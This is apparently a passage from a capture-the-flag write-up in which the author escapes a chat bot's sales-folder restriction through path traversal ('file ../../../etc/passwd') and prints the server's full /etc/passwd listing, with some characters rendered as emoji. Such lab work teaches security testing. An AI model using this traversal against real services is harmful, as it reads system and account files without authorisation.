Looks like the bot has two main funcitons

```
File - Will print the contence of a file
List - Will print a list of the directory
```

the bot's help file says we are restricted to the sales folder, but this was poorly implemented as we can use ../ to escape.

lets print /etc/passwd!

```input
file ../../../etc/passwd
```

```output
root❌0:0:root:/root:/bin/bash  
bin❌1:1:bin:/bin:/sbin/nologin  
daemon❌2:2:daemon:/sbin:/sbin/nologin  
adm❌3:4:adm:/var/adm:/sbin/nologin  
lp❌4:7:lp:/var/spool/lpd:/sbin/nologin  
sync❌5:0:sync:/sbin:/bin/sync  
shutdown❌6:0:shutdown:/sbin:/sbin/shutdown  
halt❌7:0:halt:/sbin:/sbin/halt  
mail❌8:12:mail:/var/spool/mail:/sbin/nologin  
operator❌11:0:operator:/root:/sbin/nologin  
games❌12💯games:/usr/games:/sbin/nologin  
ftp❌14:50:FTP User:/var/ftp:/sbin/nologin  
nobody❌65534:65534:Kernel Overflow User:/:/sbin/nologin  
dbus❌81:81:System message bus:/:/sbin/nologin  
systemd-coredump❌999:997:systemd Core Dumper:/:/sbin/nologin  
systemd-resolve❌193:193:systemd Resolver:/:/sbin/nologin  
tss❌59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin  
polkitd❌998:996:User for polkitd:/:/sbin/nologin  
geoclue❌997:994:User for geoclue:/var/lib/geoclue:/sbin/nologin  
rtkit❌172:172:RealtimeKit:/proc:/sbin/nologin  
qemu❌107:107:qemu user:/:/sbin/nologin  
apache❌48:48:Apache:/usr/share/httpd:/sbin/nologin  
cockpit-ws❌996:993:User for cockpit-ws:/:/sbin/nologin  
pulse❌171:171:PulseAudio System Daemon:/var/run/pulse:/sbin/nologin  
usbmuxd❌113:113:usbmuxd user:/:/sbin/nologin  
unbound❌995:990:Unbound DNS resolver:/etc/unbound:/sbin/nologin  
rpc❌32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin  
gluster❌994:989:GlusterFS daemons:/run/gluster:/sbin/nologin  
chrony❌993:987::/var/lib/chrony:/sbin/nologin  
libstoragemgmt❌992:986:daemon account for libstoragemgmt:/var/run/lsm:/sbin/nologin  
saslauth❌991:76:Saslauthd user:/run/saslauthd:/sbin/nologin  
dnsmasq❌985:985:Dnsmasq DHCP and DNS server:/var/lib/dnsmasq:/sbin/nologin  
radvd❌75:75:radvd user:/:/sbin/nologin  
clevis❌984:983:Clevis Decryption Framework unprivileged user:/var/cache/clevis:/sbin/nologin  
pegasus❌66:65:tog-pegasus OpenPegasus WBEM/CIM services:/var/lib/Pegasus:/sbin/nologin  
sssd❌983:981:User for sssd:/:/sbin/nologin  
colord❌982:980:User for colord:/var/lib/colord:/sbin/nologin  
rpcuser❌29:29:RPC Service User:/var/lib/nfs:/sbin/nologin  
setroubleshoot❌981:979::/var/lib/setroubleshoot:/sbin/nologin  
pipewire❌980:978:PipeWire System Daemon:/var/run/pipewire:/sbin/nologin  
gdm❌42:42::/var/lib/gdm:/sbin/nologin  
gnome-initial-setup❌979:977::/run/gnome-initial-setup/:/sbin/nologin  
insights❌978:976:Red Hat Insights:/var/lib/insights:/sbin/nologin  
sshd❌74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin  
avahi❌70:70:Avahi mDNS/DNS-SD Stack:/var/run/avahi-daemon:/sbin/nologin  
tcpdump❌72:72::/:/sbin/nologin  
mysql❌27:27:MySQL Server:/var/lib/mysql:/sbin/nologin  
nginx❌977:975:Nginx web server:/var/lib/nginx:/sbin/nologin  
mongod❌976:974:mongod:/var/lib/mongo:/bin/false  
rocketchat❌1001:1001::/home/rocketchat:/bin/bash  
dwight❌1004:1004::/home/dwight:/bin/bash
```